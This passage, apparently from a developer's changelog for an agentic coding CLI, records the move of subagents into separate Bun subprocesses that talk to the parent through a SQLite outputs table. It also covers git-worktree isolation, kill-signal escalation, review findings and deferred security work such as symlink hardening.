  `SELECT policy_snapshot ...` shows `'{}'`; in-memory
  reading yields strict-defaults Policy. Operator forensic
  queries should know the divergence. Documented in the
  migration comment + repo comment.
- **m3 — No direct migration 015 test.** Cover via the
  insert/get round-trip tests on the column. A
  `PRAGMA table_info(subagent_runs)` assertion would lock
  the schema shape explicitly; ~10 LOC, defer.

**Verification:** `bun test` 1282 pass / 11 skip / 0 fail
(+5 since `cfd60d0`: deep-clone test, snapshot round-trip,
real-gate probe, pre-015 fallback, hermetic-test cleanup);
`tsc --noEmit` clean; `biome check` clean.

**Next:** M3 / Step 4.2b.ii.b — heartbeat writer in the
child loop + parent-side stale-row poller + planMode/
temperature forwarding via the audit row + parallel-children
stress fixture. M2 from .ii.a review is now closed; M3 (stale
'running' rows on parent crash) and M5 (concurrent spawns)
remain for .ii.b.

---

## [2026-04-30] M3 / Step 4.2b.ii.a — subprocess spawn (subagent isolation v1)

The 4.2b.i closing entry left `subagent_outputs` schema in place
without anything writing to it. This slice flips the subagent
runtime from in-process (4.2a) to a separate Bun subprocess that
IS the canonical isolation mandated by AGENTIC_CLI §11:1030
("mesmo binário, processo separado, comunicação via SQLite —
write-only do filho, read-only do pai"). The parent creates the
child session row + audit row + seed user message BEFORE
spawning; the child binary detects the subagent-child mode via
`--subagent-session-id <uuid>`, runs the harness against the
preassigned session id, and publishes its terminal envelope to
`subagent_outputs`. The parent polls until the payload lands or
the timeout/abort path forces a kill. Heartbeat-driven liveness,
symlink hardening, and bgLogDir per-worktree stay deferred to
.ii.b/.iii/.iv.

**Slice scope:**

| Component | Status | Notes |
|---|---|---|
| `src/harness/types.ts` | UPDATED | New `HarnessConfig.preassignedSessionId?` — when set, `runAgent` skips both `createSession` and `reopenSession` and uses the caller-provided id. Mutually exclusive with `resumeFromSessionId`. |
| `src/harness/loop.ts` | UPDATED | Three branches now: resume, preassigned, fresh. Preassigned verifies the row exists with matching cwd and `status='running'`. Message hydration unified across resume + preassigned so the subprocess child sees the parent-inserted seed user message; userPrompt append skipped when `userPrompt === ''`. |
| `src/cli/args.ts` | UPDATED | `--subagent-session-id <uuid>` flag (internal). Captured into `args.subagentSessionId`. |
| `src/cli/index.ts` | UPDATED | Subagent-child short-circuit before all other modes — when the flag is present, lazy-imports and runs the child handler. |
| `src/cli/subagent-child.ts` | NEW | Child entry path. Loads session + audit row, builds permission engine + provider + tool registry from the audit's whitelist, runs `runAgent` with `preassignedSessionId`, extracts terminal output, publishes envelope via `setSubagentPayload`. Error-envelope side channel for pre-run failures (unknown model, unknown tool from snapshot) so the parent's poller never times out on a recoverable diagnosis. |
| `src/subagents/runtime.ts` | MAJOR REWRITE | Replaced the in-process `runAgent` call with `Bun.spawn` of the same binary. New flow: validate registry → create worktree if isolated → `createSession` for the child → insert `subagent_runs` (FK target now exists) → append seed user message → spawn → poll `subagent_outputs.payload` with backoff → timeout/abort kill escalation (SIGTERM → grace → SIGKILL) → cleanup worktree → insert `subagent_worktrees`. Added `SpawnChildProcess` type so tests can inject a fake; default factory uses `Bun.argv` to detect dev (interpreter+script) vs compiled (binary only). Reason union widened with `subprocess_crashed`. |
| `tests/harness/loop.test.ts` | UPDATED | +5 tests for the preassigned path (happy, missing id, cwd divergence, finalized row, mutual exclusion with resume). |
| `tests/cli/args.test.ts` | UPDATED | +3 tests for `--subagent-session-id` parsing. |
| `tests/cli/subagent-child.test.ts` | NEW | 4 tests — happy harness run + payload publish; missing session id; non-subagent session refused; missing audit row refused. Uses an on-disk DB so the child handler's openDb path is exercised the same way the real subprocess uses it. |
| `tests/subagents/runtime.test.ts` | REPLACED | The 4.2a in-process tests didn't translate to the subprocess shape; replaced with 16 focused tests built around `SpawnChildProcess` fakes (done payload, exhausted forwarding, crash, wall-clock timeout, abort escalation, whitelist refusals, depth boundary, worktree clean/dirty/create-fail, isolation=none baseline). Symlink hardening test stays `.skip` for 4.2b.iii. |

**Decisions:**

- **`preassignedSessionId` instead of factoring out `createSession`.**
  The subprocess flow needs the parent and child to share the
  same session row. Refactoring `runAgent` to expose a "create
  session before / use existing" split would have rippled
  through every harness-construction path. A single optional
  field that skips both lifecycle hooks is the smallest correct
  change. Mutual-exclusion guard with `resumeFromSessionId` so
  setting both fails loud rather than picking one silently.
- **Message hydration unified across resume + preassigned.**
  The seed user message the parent inserts before spawn must be
  visible to the child harness's loop. Initially I considered a
  separate path but the resume code already does exactly the
  right thing — load tail messages, build the in-memory array,
  carry the parent_id chain. Generalizing the trigger condition
  (`preexistingId = resumeId ?? preassignedId`) reuses the
  hardened path. The empty-userPrompt skip handles the case
  where the parent already inserted the seed.
- **Audit row lands BEFORE spawn (was post-run in 4.2a).**
  The child reads its own definition from `subagent_runs`. The
  row MUST exist when the child opens the DB; without that, the
  child has no way to discover its system prompt, tools, or
  budget. Audit failure here can no longer be best-effort —
  it's a precondition for the child to function. The runtime
  cleans up the worktree if audit insert throws and propagates
  the exception; auditFailure on the result is now reserved
  for the worktree-audit insert (which IS best-effort because
  it lands post-cleanup).
- **Seed user message via the messages table, not CLI argv.**
  Considered passing the prompt as a `--prompt <json>` flag.
  Rejected: prompts can be 32KB (PROMPT_MAX_BYTES); CLI argv
  size limits + escaping become real concerns. Inserting as a
  message uses the same channel the child harness already
  reads, no new IPC surface.
- **Subprocess detection via `Bun.argv` shape, not env var.**
  The default `defaultSpawnChildProcess` checks if argv[1]
  ends in `.ts`/`.js` (dev mode, need interpreter+script) vs
  not (compiled binary). Env var (`FORJA_BIN`) considered but
  env vars leak into logs and child processes; argv shape is
  closed over the launcher's own state. Production compiled
  binary just uses argv[0]; dev `bun run` keeps both.
- **Polling instead of inotify/fs-watch on the SQLite file.**
  Polling is portable (Linux/macOS/Windows), simple to reason
  about, and the latency cost is sub-second for runs that
  themselves take seconds. Backoff 50ms → 500ms keeps fast
  runs cheap (sub-second completion sees ≤ 2 polls) while
  bounding wakeups on long runs.
- **SIGTERM → grace → SIGKILL escalation, grace configurable.**
  Per FAILURE_MODES §7.3: 5s grace default. The grace value is
  exposed as `RunSubagentInput.graceMs` so tests can use a
  small value (50ms) and complete inside bun's default 5s
  per-test timeout. Production callers omit it.
- **Crash without payload → `subprocess_crashed`, NOT
  `internalError`.** The harness's `internalError` reason is
  reserved for the harness's own uncaught throws; subprocess
  crashes are an architectural layer above that. Distinct
  reason lets operators triage `subprocess_crashed` (look for
  a child stack trace) vs `internalError` (look for harness
  bug) without conflating them.
- **`SpawnChildProcess` is an injection point.** Same shape as
  `bgManager` and other testable seams. Tests fake the
  subprocess by writing the payload directly and resolving
  exited; production uses `Bun.spawn`. Single integration test
  invoking the real binary deferred to a follow-up — the
  fakes verify every parent-side behavior except "argv shape
  resolves to a runnable binary", which is an integration
  concern, not a unit concern.
- **Old in-process runtime tests REPLACED, not adapted.** The
  4.2a tests asserted in-process semantics: provider used by
  `runSubagent` directly, audit landing post-run, planMode
  threading through child config, etc. None of those hold
  under the subprocess shape — provider lives on the child's
  registry lookup, audit lands pre-spawn, planMode threading
  hasn't been wired to the child binary yet (deferred to
  .ii.b). Replacing rather than adapting kept the test surface
  honest about what's being tested.

**What this DOESN'T close (deferred):**

- **No heartbeat poller.** Wall-clock timeout is the only
  liveness check today. A child that responds to signals but
  hangs inside a tool call (no provider response, no exit) is
  caught only when wallClockMs fires — which can be minutes.
  4.2b.ii.b adds heartbeat writes from the child (pulse every
  ~1s) and a `listStaleSubagentOutputs`-driven poller in the
  parent that catches "heartbeat older than threshold even
  though wall-clock budget remaining."
- **No symlink hardening.** Spec SECURITY §8.4 deny-list copy
  + realpath validation lands in 4.2b.iii.
- **No bgLogDir per-worktree.** `requiresBgManager` tools are
  still refused under any isolation; 4.2b.iv lifts the gate
  after wiring per-worktree bg log directories.
- **No planMode threading to subprocess.** The 4.2a in-process
  flow forwarded `config.planMode` to the child harness. The
  subprocess child today doesn't read planMode from the audit
  row (the audit doesn't store it). Adding a column or a
  separate IPC channel for run-level flags lands in .ii.b.
  Until then, plan-mode subagents would silently lose the
  flag — but the parent's `task` tool gate (planSafe:false)
  already refuses spawning under plan mode, so the surface is
  closed at a higher layer.
- **No real-binary integration test.** Unit tests inject
  `SpawnChildProcess` fakes; they verify every parent-side
  behavior except "the default factory's argv resolution
  produces a runnable binary." Test for that lives outside
  bun-test (eval / smoke suite) because it requires either a
  compiled binary in `dist/` or a dev `bun run` exec path,
  neither available reliably in the unit-test loop.
- **`onEvent` doesn't deliver child events to the parent.**
  The subprocess can't stream HarnessEvents across the IPC
  boundary; the parent sees only the terminal payload. Hook
  reserved for parity with the in-process API. M4's TUI work
  may add a separate event-stream channel via SQLite or an
  IPC pipe.

**Review pass (post-self-review).** Self-review surfaced 4
critical + 5 medium + 3 minor. All addressable items addressed
in the same commit chain; the four deferred items are recorded
in Pending.

- **C1 — child stdout/stderr never drained.** `Bun.spawn` was
  configured `stdout: 'pipe', stderr: 'pipe'` but neither
  stream was read; a child that wrote > pipe buffer (~64KB on
  Linux) to stderr would block on write. Symptom would have
  been "long subagent runs randomly hang." Fix: stdout now
  `'ignore'` (production children shouldn't write to stdout —
  IPC is via SQLite); stderr `'pipe'` and drained in
  background. Captured stderr is dropped today; future slice
  routes to per-worktree log dirs.
- **C2 — `appendMessage` failure between audit insert and
  spawn leaked the worktree.** Original try/catch wrapped only
  `insertSubagentRun`; a throw from `appendMessage` (FK
  concurrent delete, schema drift) left the worktree dir + the
  agent branch on disk with no operator-visible audit. Fix:
  shared `cleanupOnFail` helper covering audit insert,
  appendMessage, and the spawn call; any throw cleans up
  consistently. New regression test forces the failure by
  dropping the messages table mid-flight.
- **C3 — `Bun.spawn` synchronous throw escaped the runtime.**
  ENOENT (binary not found), EACCES, out-of-fds, etc. all
  produce a synchronous exception from Bun. Without the catch,
  the caller saw an unhandled throw instead of a recoverable
  `RunSubagentResult`. Fix: spawn wrapped in try/catch that
  cleans up worktree and resolves with `status='error',
  reason='subprocess_spawn_failed'`. New reason added to the
  RunSubagentResult union; `worktreeError`-shaped side-channel
  carries the original message for diagnosis.
- **C4 — parent and child wall-clock raced.** Both used the
  same `definition.budget.maxWallClockMs`; if both fire at the
  same instant, the parent's SIGTERM/SIGKILL could land
  mid-`setSubagentPayload` from the child's own
  wall-clock-induced cleanup, losing the terminal envelope.
  Fix: parent's effective wall-clock now defaults to
  `childWallClockMs + 2 × graceMs`, giving the child time to
  hit its own budget AND publish before the parent's outer
  kill fires. Caller's explicit `wallClockMs` overrides
  (tests rely on this for fast timeout exercise).
- **M1 — `signal.aborted` race with `exitedResolved`.** SIGINT
  propagates to the whole process group, so a child can exit
  before the wait loop ever set `killed='aborted'`. The
  exited-branch then fell through to `crashed`, misreporting a
  user abort as a crash. Fix: explicit `signal.aborted` check
  at the top of the exited branch. Regression test pre-aborts
  the controller and uses a fixture that exits immediately
  without payload — must surface as `aborted`.
- **M4 + m2 — extracted `resolveChildBinaryCmd` + renamed
  `validateChildRegistry`.** The argv-detection heuristic was
  inline and untested; now a pure function with 6 unit tests
  covering compiled binary, dev script, extended suffixes
  (`.ts`, `.js`, `.mts`, `.cts`, `.mjs`), edge cases (argv
  missing, single-element argv, no-extension binary).
  `validateChildRegistry` returned `void`; renamed to
  `assertWhitelistValidForSubagent` so the void return matches
  the imperative name.

**Pending (deferred — not blocking, recorded for visibility):**

- **M2 — policy drift between parent spawn and child read.**
  Child re-resolves `.agent/permissions.yaml` etc. on its own
  startup; if the file changed between spawn and child read,
  the child runs under a different policy than the parent
  expected. Race window is hundreds of ms in practice. Fix
  candidate: persist policy snapshot on the audit row similar
  to system_prompt + tools_whitelist; blocks 4.2b.ii.b which
  also needs to forward planMode/temperature to the child.
- **M3 — stale 'running' rows when parent crashes between
  createSession and spawn.** `completeSession` never fires;
  operator's `--list-sessions` shows the row as still running
  forever. The 4.2b.ii.b heartbeat poller will detect this
  via "is_subagent + status='running' + last_heartbeat NULL
  for > N seconds" and mark stale. Closing the gap requires
  the heartbeat machinery anyway; defer to the same slice.
- **M5 — concurrent subagent spawns from same parent.**
  Two `task()` calls in the same model turn produce two
  parallel children; each gets its own session id + worktree
  + outputs row, so logically should work. Untested. SQLite
  WAL mode handles concurrent writes; risk is theoretical
  but operationally unverified. Add a fixture in 4.2b.ii.b
  alongside the heartbeat work where parallel children are
  the expected stress shape.
- **m1 — poll cadence aggressive on the cold start.**
  50ms → 100 → 200 → 400 → 500 cap means ~5 polls in the
  first second. Each poll runs an indexed SELECT on
  `subagent_outputs`, which competes with the child's UPDATE
  briefly via SQLite reader-writer locking. Fine under
  unit-test load, possibly suboptimal under thousand-subagent
  CI. Tune (or move to event-driven via a notifier table) if
  benchmarks justify; trivial change.
- **m3 — `handle.kill` typed strictly to `'SIGTERM' |
  'SIGKILL'`.** Bun.spawn accepts any signal name; we
  restrict for caller safety (a future caller passing
  SIGUSR1 wouldn't behave as the wait loop expects). Kept;
  documenting the intent is enough.

**Verification (post-review):** `bun test` 1275 pass / 11
skip / 0 fail (+9 across the new failure paths, the argv
resolver, and the abort race); `tsc --noEmit` clean;
`biome check` clean.

**Next:** M3 / Step 4.2b.ii.b — heartbeat writer in the child
loop + parent-side stale-row poller + planMode/temperature
forwarding via the audit row (closes M2 + M3 + the planMode
regression noted above). Add the parallel-children stress
fixture (M5) at the same time. After .ii.b, .iii (symlink
hardening) and .iv (bgLogDir per-worktree) finish out the
4.2b arc.

---

## [2026-04-30] M3 / Step 4.2b.i — subagent_outputs IPC schema

The 4.2a closing entry left subagents running in-process: a child
crash takes the parent down, audit only lands post-cleanup (FK
to sessions(id) requires the child session to exist), and there
is no place for a subprocess to write liveness signals. Step
4.2b moves execution to a separate Bun subprocess with SQLite as
the unidirectional channel (spec AGENTIC_CLI §11:1030 — "mesmo
binário, processo separado, comunicação via SQLite (write-only
do filho, read-only do pai)"). That work is too large for a
single PR; this slice (4.2b.i) lands ONLY the schema + repo so
the design of the IPC table can be reviewed in isolation.
4.2b.ii will write the runtime that uses it, .iii hardens
symlinks per SECURITY §8.4, .iv wires per-worktree bgLogDir.

**Slice scope:**

| Component | Status | Notes |
|---|---|---|
| `src/storage/migrations/014-subagent-outputs.ts` | NEW | Single table: `session_id PK FK CASCADE`, `payload TEXT` (nullable JSON), `last_heartbeat INTEGER` (nullable), `created_at` / `updated_at`. Partial index on `last_heartbeat ASC WHERE NOT NULL` for the parent's stale-row poller. |
| `src/storage/repos/subagent-outputs.ts` | NEW | `insertSubagentOutput`, `updateSubagentHeartbeat`, `setSubagentPayload`, `getSubagentOutput`, `listStaleSubagentOutputs`. Defensive JSON parse on payload — malformed → null, surrounding columns intact. |
| `src/storage/index.ts` | UPDATED | Re-exports for the new repo. |
| `src/storage/migrations/index.ts` | UPDATED | Migration 014 registered. |
| `tests/storage/subagent-outputs.test.ts` | NEW | 15 tests — round-trip, default-null shape, PK conflict, heartbeat update, payload update, payload survives heartbeat-only update, FK CASCADE, parent-purge non-cascade, malformed JSON defense, non-object payload defense, stale list ordering + null exclusion, stale list empty case, missing-row throws (heartbeat + payload), unknown-session lookup. |

**Decisions (D1-D5 locked, D6 deferred to 4.2b.ii):**

- **D1 — schema as `(session_id PK FK CASCADE, payload TEXT, last_heartbeat INTEGER, created_at, updated_at)`.** PK = session_id mirrors `subagent_runs` and `subagent_worktrees` — 1:1 with sessions, the row never outlives the session. An auto-increment id would be one more join with no payoff. payload stored as TEXT under the same convention `messages.content` and `subagent_runs.tools_whitelist` use; consumers parse on read.
- **D2 — no `status` column.** Subagent lifecycle status already lives on `sessions.status`. Duplicating it here invites the two columns to drift; forensic queries that need "still running" join `sessions` on session_id and filter `sessions.status`. `last_heartbeat IS NULL` distinguishes "row exists but child not active yet" from "child is alive and pulsing".
- **D3 — partial index on `last_heartbeat ASC WHERE last_heartbeat IS NOT NULL`.** The parent's timeout poller wants the longest-quiet children first; the partial form skips never-heartbeated rows (pre-spawn or spawn-failed; not the timeout subsystem's concern). `created_at` doesn't get an index — no query orders by it today, and the migration runner already handles ordering by id.
- **D4 — `ON DELETE CASCADE` on the FK to sessions(id), no cascade through parent_session_id.** Same shape locked for migrations 012 and 013: deleting the child session drops its outputs row; deleting the parent runs the existing `parent_session_id ON DELETE SET NULL` and leaves the child + its outputs intact. Operators can purge a parent without losing the child's IPC audit trail.
- **D5 — defensive JSON parse on payload.** Storage corruption is unlikely (TEXT is opaque to SQLite, only our own code writes), but a malformed payload must NOT crash audit listings. Repo returns `payload: null` and surrounding columns intact; consumers detect via `payload === null` paired with non-null timestamps. Mirror of the same pattern in `subagent-runs.ts` for `tools_whitelist`. We also reject non-object JSON (arrays, scalars) — the typed contract is `Record<string, unknown> | null`, and surfacing a shape the consumer wasn't typed for is worse than null.
- **D6 (deferred to 4.2b.ii)** — Child entrypoint mechanism (`--subagent-session-id <uuid>` flag is the planned shape), heartbeat frequency (planned 1000ms), SIGTERM grace period (5s per FAILURE_MODES §7.3), bgLogDir path convention (planned `<worktree>/.bg-logs/`). These don't bind anything in 4.2b.i; the schema accommodates whatever cadence and flag shape .ii lands on.

**API decisions inside the repo:**

- **Two write helpers (`updateSubagentHeartbeat`, `setSubagentPayload`), not one.** A heartbeat pulse must not require the child to know its terminal payload yet, and writing the terminal payload must not require an additional heartbeat hop. Both helpers bump `last_heartbeat` AND `updated_at` so the parent never sees a "payload published but child looks dead" state mid-write — consumers see them atomically.
- **Both write helpers throw on missing row.** The 4.2b.ii flow always inserts before the first heartbeat; a missing row indicates a programmer / sequencing bug rather than a recoverable runtime state. Failing loud surfaces the bug at the call site instead of letting the pulse silently no-op.
- **Insert defaults `payload` and `lastHeartbeat` to null.** The canonical 4.2b.ii sequence is INSERT (null payload, null heartbeat) → first heartbeat UPDATE → … → final payload UPDATE → exit. The optional fields let tests stage pre-populated rows without follow-up updates.

**What this DOESN'T close (already known, out of scope for the schema slice):**

- **No subprocess yet.** runSubagent still runs in-process (4.2a path); no code populates `subagent_outputs` yet. The table sits empty until 4.2b.ii.
- **No symlink hardening.** SECURITY_GUIDELINE §8.4 deny-list and realpath validation land in 4.2b.iii.
- **No bgLogDir per-worktree.** `requiresBgManager` tools are still refused under any isolation; 4.2b.iv lifts the gate after wiring per-worktree bg log directories.
- **No timeout enforcer.** The repo provides `listStaleSubagentOutputs` for the future poller but the poller itself (which translates a stale row into SIGTERM → grace → SIGKILL) is 4.2b.ii.
- **Schema doesn't store the wall-clock budget.** A future timeout enforcer needs to know each child's `maxWallClockMs` to compute the cutoff. That field already lives on `subagent_runs.budget_max_wall_ms` (migration 012); the poller joins instead of duplicating.

**Review pass (post-self-review).** Self-review surfaced 1
critical + 3 medium + 3 minor. All addressed in the same commit
chain.

- **C1 — UPDATE helpers didn't protect against retroactive ts.**
  `updateSubagentHeartbeat` / `setSubagentPayload` did `SET col
  = ?` blindly; an out-of-order ts (NTP step backward on the
  child host, container reinit, VM migration between hosts with
  skewed clocks, retried writes from test fixtures) would
  regress `last_heartbeat` and the parent's poller would mark a
  healthy child as stale, sending SIGTERM. Fix: both helpers now
  `SET last_heartbeat = MAX(IFNULL(last_heartbeat, 0), ?),
  updated_at = MAX(updated_at, ?)`. `IFNULL(...,0)` covers the
  first heartbeat case where the column starts NULL. The
  `setSubagentPayload` helper still overwrites `payload`
  unconditionally — a re-publish from a retried final-write
  must end up with the latest envelope, which is the child's
  authoritative state. Locked by two regression tests:
  out-of-order heartbeat doesn't regress, out-of-order
  setSubagentPayload writes payload but keeps ts forward.
- **M1 — `setSubagentPayload` re-publish wasn't tested.** The
  doc treats the call as "last write before exit", but the repo
  permits re-publish (UPDATE, not INSERT) so a retried
  final-write lands. Locked by an explicit test that calls the
  helper twice and asserts the second envelope wins.
- **M2 — empty object payload `{}` boundary case.** The
  `parsePayload` reject path treats arrays and scalars as
  shape-violating (returns null); `{}` is a structurally valid
  Record<string, unknown> with no keys and must round-trip
  intact. Test asserts the cycle preserves the empty object
  reference (not collapsed to null).
- **M3 — `lastHeartbeat: 0` semantics documented.** Nothing
  enforces that ts inputs are `Date.now()`-shaped; the schema
  accepts any positive integer. Comment on
  `InsertSubagentOutputInput.lastHeartbeat` notes that values
  like 0 are technically accepted but semantically meaningless
  and would surface as "ancient" rows in
  `listStaleSubagentOutputs`. Tests that need determinism
  should use small plausible epoch values so MAX-guarded
  updates have room to advance.
- **m1 — no index on `updated_at`.** Migration comment now
  records that the column is on the row for future audit
  queries but the index is deferred to "first real query"
  (likely a janitor in 4.2b.ii that prunes stale outputs whose
  owning sessions already finished). Adding a partial index in
  a follow-up migration is cheaper than indexing speculatively.

**Pending (deferred — not blocking, recorded for visibility):**

- **`parsePayload` collapses parse-error and shape-error into
  null.** A forensic audit consumer investigating "why did
  payload disappear?" can't distinguish "JSON malformed" from
  "JSON valid but not an object". A future helper could return
  `{ value } | { error: 'parse' | 'shape' }`; deferred —
  overkill for 4.2b.i, may pay for itself once 4.2b.ii produces
  real corruption rates.
- **`Record<string, unknown>` on payload is intentionally
  loose.** The real shape is the subagent envelope (status,
  reason, cost_usd, output, etc — see `SubagentEnvelope` in
  `subagents/runtime.ts`). Importing that type into the storage
  repo would create a cyclic dep (`storage` ← `subagents`); the
  cleaner shape is a higher-layer envelope helper that the
  4.2b.ii subprocess code routes through. Land that with the
  subprocess work.

**Verification (post-review):** `bun test` 1262 pass / 11 skip /
0 fail (+19 across the schema repo); `tsc --noEmit` clean;
`biome check` clean.

**Next:** M3 / Step 4.2b.ii — subprocess spawn + heartbeat writer + parent-side timeout poller + IPC plumbing in `runSubagent`. Replaces the in-process `runAgent` call with `Bun.spawn` of the same binary in subagent-child mode (entrypoint detection via `--subagent-session-id <uuid>`); child writes via the helpers landed here, parent reads + enforces the wall-clock budget via SIGTERM/SIGKILL sequencing per FAILURE_MODES §7.3. Step 4.2b.iii (symlink hardening) and .iv (bgLogDir per-worktree) follow.

---

## [2026-04-30] M3 / Step 4.2a — worktree skeleton (write-tool gate lifted)

The Step 4.1 closing entry left every writing subagent unrunnable:
the loader / validator / runtime all refused `metadata.writes=true`
in `tools[]`. This slice opens that surface for definitions that
opt into `isolation: worktree` — the canonical path spec §11.2
prescribes for any subagent that edits code. Subprocess spawn,
heartbeat-based timeout, and full checkpoint chain re-enablement
stay deferred; this slice delivers ONLY the lifecycle: create
worktree → run child with `cwd=worktree-root` → cleanup → audit.

**Slice scope:**

| Component | Status | Notes |
|---|---|---|
| `src/subagents/types.ts` | UPDATED | New `SubagentIsolation = 'none' \| 'worktree'` field on `SubagentDefinition`. Required (no default at the type level) so every consumer is forced to acknowledge the choice; the loader fills 'none' for legacy frontmatter. |
| `src/subagents/load.ts` | UPDATED | Parses optional `isolation:` frontmatter; rejects any value other than the two literals (typo defense — `isolation: worktee` MUST NOT silently downgrade to none). Adds `isolation` to the `known` set so it doesn't leak into `meta`. |
| `src/subagents/validate.ts` | UPDATED | Lifts the `writes:true` refusal when `definition.isolation === 'worktree'`. The unregistered-tool check stays unconditional. |
| `src/subagents/runtime.ts` | UPDATED | `buildChildRegistry` accepts `allowWrites`; `runSubagent` creates a worktree before `runAgent` when isolation is declared, sets the child's `cwd` to the worktree root, runs cleanup post-run, and writes the audit row. `RunSubagentResult` gains `worktree?` (clean/dirty/preserved/removed) and `worktreeError?` (pre-run failure). The `reason` type is widened to `ExitReason \| 'worktree_create_failed'` because the new failure path doesn't go through the harness loop. |
| `src/subagents/worktree.ts` | NEW | `createWorktree`, `cleanupWorktree`, `slugify`, `branchName`, `defaultWorktreeRoot`. Self-contained — does not reuse `checkpoints/git.ts:runGit` because that helper is private and tuned for index-isolated snapshots; pulling it onto a shared surface would force a refactor unrelated to this slice. |
| `src/storage/migrations/013-subagent-worktrees.ts` | NEW | `subagent_worktrees` table — session_id PK + FK CASCADE, path, branch, status CHECK active/preserved/cleaned, created_at, cleaned_at. Index on `status` for the future GC sweep (4.2d). |
| `src/storage/repos/subagent-worktrees.ts` | NEW | `insertSubagentWorktree` / `getSubagentWorktree` / `listActiveSubagentWorktrees`. The CHECK admits 'active' even though 4.2a only writes terminal rows — pre-staging the schema for 4.2b's subprocess work. |
| `src/tools/types.ts` | UPDATED | `SpawnSubagentResult.kind='ran'` carries `worktree?` and `worktreeError?` so the harness loop's spawn closure can forward them. |
| `src/harness/loop.ts` | UPDATED | Spawn closure forwards the two new optional fields; existing 'ran' contract unchanged. |
| `src/tools/builtin/task.ts` | UPDATED | `TaskOutput` envelope gains `worktree?`; non-`done` mapping echoes both `worktree` and `worktree_error` in `details` so the model reads them on the `subagent.run_failed` branch too. |
| Tests | NEW + UPDATED | `tests/subagents/worktree.test.ts` (17 — slugify, branchName, defaultWorktreeRoot, create happy path, orphan-path refusal, non-git refusal, chmod-tightening, cleanup clean/dirty-untracked/dirty-tracked, preserved-row enumeration), `tests/storage/subagent-worktrees.test.ts` (8 — round-trip terminal+active, FK CASCADE, parent-purge non-cascade, CHECK violation, list ordering, null lookup), `tests/subagents/load.test.ts` (+4 — isolation default, isolation: worktree, isolation: none, typo refusal), `tests/subagents/validate.test.ts` (+3 — worktree lifts gate, worktree still rejects unknowns, none keeps gate), `tests/subagents/runtime.test.ts` (+5 — clean run cleanup + audit, dirty run preservation + audit, create-failure surface, write_file end-to-end, isolation=none keeps fields absent). Existing tests updated to include `isolation: 'none'` on the definition fixtures. |

**Decisions:**

- **Worktree root: `~/.cache/agent/worktrees/<id>/` with chmod 0700, NOT `/tmp`.** Per SECURITY_GUIDELINE §8.4: `/tmp` on shared systems opens symlink-traversal exposure and tmpfs eats the worktree on reboot while a paused subagent might still want to be inspected. XDG-aware lookup (`$XDG_CACHE_HOME` → `~/.cache`); empty-string XDG var treated as unset (common shell oddity). The chmod is applied even to a pre-existing root so a looser parent install can't downgrade the protection.
- **Worktree id ≠ session id.** I considered preassigning a session id so the worktree path matched `/<session-id>/`, but that required reaching into `runAgent`'s session-creation flow (a non-trivial refactor for a cosmetic correlation). The audit table stores both `session_id` and `path` — operators correlate via SQL, not by reading directory names. Keeping the worktree id as a fresh UUID independent of the session is the smaller change.
- **Single post-cleanup audit INSERT (not insert-then-update).** The FK on `subagent_worktrees.session_id → sessions(id)` requires the child session to exist, and that happens INSIDE `runAgent`. Pre-creation insertion is impossible without restructuring the harness; intermediate `active` state matters only when 4.2b adds subprocess heartbeats. For in-process synchronous execution the row lands once, with the resolved status. The CHECK accepts 'active' anyway so 4.2b can extend without a constraint rewrite.
- **`reason` widened to `ExitReason | 'worktree_create_failed'` instead of adding a new `kind` to `SpawnSubagentResult`.** Adding a `spawn_failed` discriminator would have rippled through tools/types.ts, harness/loop.ts, task.ts and their tests for one new code path. Reusing the existing `ran` kind with `status='error'` and a custom reason is honest: the calling tool already maps non-`done` to `subagent.run_failed`, and the worktree-create failure is exactly that — a run that didn't happen because spawn failed. New kind reconsidered when 4.2b's subprocess path produces additional pre-run failure modes.
- **Branch name: `agent/<slug-of-prompt>-<8-char-uuid>`, slug capped at 40 chars.** Slug for human readability when running `git branch --list 'agent/*'`; uuid suffix for collision safety when two parallel runs share a prompt. `slugify` lowercases, collapses non-alnum runs to `-`, trims edges, and falls back to `'task'` on empty/sanitize-to-empty inputs (avoids producing `agent/-<id>` which git refuses).
- **Cleanup policy: clean tree → remove (`worktree remove --force` + `branch -D`); dirty tree → preserve.** `git status --porcelain` empty means the child made no tracked or untracked diff — there's nothing to keep. `--force` because ignored files git would call "would be lost" don't survive the same bar (the cleanup contract is "no observable diff → drop"). Branch delete is best-effort; failures are diagnostic, not outcome-affecting.
- **No symlink validation, no copy-with-deny-list, no commit-on-done.** All three are real SECURITY §8.4 / FAILURE_MODES §7.2 features the spec mandates, but they belong in 4.2b (subprocess + sandbox surface) and 4.2d (commit lifecycle). Pulling them forward here would block the slice on subprocess design that hasn't happened yet.
- **`writes:true` gate stays unconditional in load + validate + runtime when isolation is 'none'.** Defense in depth: a programmatic caller building a `SubagentDefinition` directly (evals, future tooling) without going through the loader still gets protected by the runtime's `buildChildRegistry`. Any tool that opts into `metadata.writes=true` inherits the refusal automatically — no name list to keep updated.
- **Checkpoints stay OFF for worktree subagents in 4.2a.** Re-enabling them needs `refs/agent/checkpoints/<child-session>` to live inside the worktree's branch namespace without leaking into the parent's `--undo` walk. That's a non-trivial reasoning task best done in 4.2c with isolated tests; keeping them off here makes 4.2a an honest "writes are now possible, reversibility lands separately" slice instead of trying to do both at once.

**What this DOESN'T close (deferred):**

- **No subprocess.** Spec §11:1030 says "processo separado, comunicação via SQLite". 4.2a runs the child in-process — same Bun process, same DB handle, same harness invariants. Subprocess + IPC + heartbeat is 4.2b. The cost: a child that crashes hard (uncaught throw escapes the harness's top-level catch — currently exhaustive, but a future regression could lose this) takes the parent down with it. In-process is the right pragmatic default while subprocess design is being shaped.
- **No checkpoint chain.** A writing subagent's mutations land on the worktree's branch but are not snapshotted step-by-step under `refs/agent/checkpoints/<child>`. If the child writes a file then writes-and-corrupts it, the only reverse path is `git checkout` on the worktree branch — coarser-grained than the parent's per-step undo. 4.2c re-enables checkpoints inside the worktree.
- **No `agent worktree gc` CLI verb.** A preserved worktree shows up in `listActiveSubagentWorktrees(db)` and on disk under `~/.cache/agent/worktrees/`, but the operator command to enumerate + clean orphans is 4.2d. Until then, manual `git worktree remove` + `rm -rf <path>` is the recovery path.
- **No symlink hardening.** A `.gitignore`'d symlink inside the parent that points outside the repo gets carried into the worktree by `git worktree add` (it's a checkout of the same commit). 4.2a does NOT validate symlink targets at runtime; a writing subagent could escape via a pre-existing symlink. SECURITY_GUIDELINE §8.4 requires the deny-list copy + symlink validation; that lands in 4.2b together with the subprocess sandbox.
